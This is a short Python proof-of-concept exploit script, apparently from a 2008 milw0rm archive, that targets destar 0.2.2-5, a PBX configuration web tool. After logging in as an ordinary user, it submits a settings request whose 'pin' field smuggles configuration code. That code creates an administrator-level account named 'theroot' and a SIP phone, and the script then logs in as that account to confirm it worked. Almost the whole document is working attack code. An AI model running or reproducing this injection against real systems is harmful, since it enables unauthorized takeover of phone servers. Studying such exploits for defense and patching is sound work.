#
#!/usr/bin/python
#
# Exploit for destar 0.2.2-5, tested on Linux Debian
#
# Bug found and  exploit coded by a non root user
# http://nonroot.blogspot.com/
#
# Enero 2008
#
# This is a PoC, please use it just for learning how to exploit something
#
# use: $python ./exploit_code.py
#
# required: urllib, sys and re
#
import urllib
import sys,re
print "Target host: i.e: http://127.0.0.1:8080/"
host=raw_input("Target host ( include http and /): ")
user=raw_input("A normal user for destar:")
password=raw_input("A normal password for destar:")
null=""
print "trying ..."
loggin = urllib.urlencode({'name': user, 'pw': password})
attack = urllib.urlencode({'cfim': null, 'cfbs': null, 'cfto': null, 'dsec' : '45', 'vmim' : 'yes','vmbs' : 'yes', 'vmu' : 'yes', 'pin' : '1234,) ; CfgOptUser(name="theroot",secret="theroot",pc="200.75.43.187",phone="agent1",pbx="pbx1",level="4",language="en",) ; CfgPhoneSip(pbx="pbx1000",name="OpenBSD-Agent",secret="imsecure",ext= "2999",dtmfmode = "rfc2833",enablecallgroup = True,callgroup = "1",queues="queue1",panel= True' })
response= urllib.urlopen(host+"login/", loggin)
data=response.read()
lookup=re.compile("'User'").search
match=lookup(data)
if match:
	print user,"logged, now trying exploit"
else:
	print "Password invalid, try again."
	sys.exit(2)

response= urllib.urlopen(host+"user/settings/", attack)

if response:
	print "ok, attack was done, now i will try loggin like 'theroot'"
	user='theroot'
	password='theroot'
	loggin = urllib.urlencode({'name': user, 'pw': password})
	response= urllib.urlopen(host+"login/", loggin)
	data=response.read()
	lookup=re.compile("'Programmer'").search
	match=lookup(data)
	if  match:
        	print "Exploit ok. try: ",host+"/user/info"
	else:
		print "Exploit failed, sorry, maybe you need that the sysadmin restart destar, be patient!"
		sys.exit(2)
else:
	print "Exploit failed, sorry, go and find some new bug or check this code and fix it!"
	sys.exit(2)

# milw0rm.com [2008-03-24]